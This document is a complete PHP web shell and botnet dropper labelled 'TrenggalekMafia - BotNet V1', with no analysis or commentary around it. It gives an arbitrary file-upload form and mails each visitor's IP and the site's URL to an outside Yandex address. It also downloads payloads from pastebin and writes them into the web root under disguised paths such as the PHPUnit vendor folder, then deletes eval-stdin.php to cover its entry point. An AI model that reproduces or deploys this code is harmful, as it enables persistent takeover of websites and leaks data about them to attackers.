<html>
TrenggalekMafia - BotNet V1
<title>Up</title>
<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx_file'>
<input type='submit' value='upload' name='upload'>

</form>
<?php if(isset($_POST['upload'])) { if(@copy($_FILES['idx_file']['tmp_name'], $_FILES['idx_file']['name'])) { echo$_FILES['idx_file']['name']. '[<b>OK</b>]'; } else { echo$_FILES['idx_file']['name']. '[<b>FAILED</b>'; } }
 ?>
<?php
$ip = getenv("REMOTE_ADDR");
$subj98 = " Tuyul |$ip";
$email = "askamu@yandex.com";
$from = "From: Result<Tuyul";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$m22 $b75 $a45";
mail($email, $subj98, $msg8873, $from);
?>
<?php
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/asw.php" ;
$text1 = http_get('https://pastebin.com/raw/LY6HxEDi');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
$check4 = $_SERVER['DOCUMENT_ROOT'] . "/vendor/phpunit/phpunit/src/web.php" ;
$text4 = http_get('https://pastebin.com/raw/u5vP8PyY');
$open4 = fopen($check4, 'w');
fwrite($open4, $text4);
fclose($open4);
if(file_exists($check4)){
}
$check12 = $_SERVER['DOCUMENT_ROOT'] . "/config/web.php" ;
$text12 = http_get('https://pastebin.com/raw/u5vP8PyY');
$open12 = fopen($check12, 'w');
fwrite($open12, $text12);
fclose($open12);
if(file_exists($check12)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/pulang.txt" ;
$text2 = http_get('https://pastebin.com/raw/9F1GLW33');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
?>
<?php
unlink("./eval-stdin.php");
?>